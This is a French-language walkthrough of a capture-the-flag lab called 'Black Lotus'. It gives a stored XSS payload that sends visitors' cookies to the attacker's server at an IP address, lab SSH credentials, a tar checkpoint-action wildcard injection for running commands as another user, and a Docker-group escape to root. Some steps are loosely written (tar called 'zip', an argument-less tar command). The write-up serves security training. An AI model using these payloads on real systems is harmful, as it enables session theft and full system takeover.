# Black Lotus CTF Walkthrough

## Sommaire

1. [XSS & Cookie Theft](#1-xss--cookie-theft)
2. [Accès au Message de l’Admin](#2-accès-au-message-de-ladmin)
3. [Connexion SSH](#3-connexion-ssh)
4. [Escalade de privilèges via tar avec hacker](#4-escalade-de-privilèges-via-tar-avec-hacker)
5. [Exploitation des vulnérabilités de tar](#5-exploitation-des-vulnérabilités-de-tar)
6. [Docker Escape](#6-docker-escape)

## 1. XSS & Cookie Theft

On commence par créer un compte utilisateur et se connecter au site.

Ensuite, on crée une nouvelle liste avec le payload XSS suivant :

```html
<script>document.location='http://10.8.92.59:5555/steal.php?c='+document.cookie</script>
```

Ce script envoie les cookies de toute personne visitant la page vers notre serveur.

Une fois notre propre cookie reçu, on **signale la page** pour que l'administrateur la visite (simulation d'une vulnérabilité **Stored XSS**). Lorsque l’admin ouvre la page, son cookie est également envoyé à notre serveur.

On récupère alors le **cookie admin** et on le remplace dans notre navigateur avec une extension ou via les outils de développement (par exemple avec `document.cookie` dans la console).

## 2. Accès au Message de l’Admin

Une fois authentifié comme admin, un message s’affiche :

> From admin  
> Hi there you h4ck3rz, so you want the Black Lotus? Try me then. SSH to the machine with those creds: `guest:Bl4Ck_L07u5_N3rd`

## 3. Connexion SSH

On se connecte à la machine distante via SSH :

```bash
ssh guest@magic-town
# Mot de passe : Bl4Ck_L07u5_N3rd
```

🎉 **1er Flag accessible**

## 4. Escalade de privilèges via Tar depuis hacker

On découvre qu’on peut utiliser un binaire SUID `hacker` pour zipper un fichier :

```bash
# Depuis le compte guest
sudo -u hacker tar hacker.txt
```

Cela crée un fichier zip avec les droits de l'utilisateur `hacker`.

Ensuite, on dézippe le fichier pour obtenir la flag avec les permimission guest.

🎉 **2ème Flag accessible**

## 5. Exploitation des vulnérabilités de tar

Toujours avec `tar` on peut executer n’importe quelle commande depuis `hacker` donc on cree les fichiers:

```bash
touch '--checkpoint-action=exec=sh'
touch  '--checkpoint=1' 
touch temp.txt
```

Ce sont des fichiers piégés pour forcer une exécution de commande lors d'une archive avec `tar` :

```bash
sudo -u hacker tar 
```

Quand on utilise `tar` ces fichier nous ouvre un shell en tant que `hacker`.

## 6. Docker Escape

On remarque que `hacker` est dans le groupe docker donc on exécute un conteneur Docker :

```bash
docker run -v /:/mnt -it alpine
```

Avec ce volume monté, on a accès à tout le système depuis le conteneur.

Il suffit de chroot dans le système monté pour devenir root :

```bash
chroot /mnt
```

Et voilà, on est **root sur la machine** !

---

🎉 **33eme Flag accessible** depuis le système de fichiers root !
